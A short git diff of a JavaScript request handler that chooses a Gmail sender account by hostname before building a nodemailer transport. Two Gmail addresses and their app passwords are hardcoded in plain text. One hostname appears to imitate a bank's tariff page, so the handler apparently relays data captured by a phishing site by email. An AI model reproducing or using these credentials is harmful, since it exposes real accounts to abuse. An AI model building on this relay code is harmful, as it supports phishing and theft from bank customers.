@@ -11,16 +11,16 @@ export default function handler(req, res) {
 
        email = 'rewang788@gmail.com'
        pass = 'lvvsrbjjsisutmpg'
-    }else
-
-
- if (url == 'pilihan-tarif-brii.herokuapp.com'){
+ }
+  else if (url == 'pilihan-tarif-brii.herokuapp.com'){
 
        email = 'hsukses421@gmail.com'
        pass = 'hbltnliskuwnedoj'
-    }else
-
-    }
+  }
+   else {
+        email = 'hsukses421@gmail.com'
+       pass = 'hbltnliskuwnedoj'
+  }
         
         try {
             const transporter = nodemailer.createTransport({
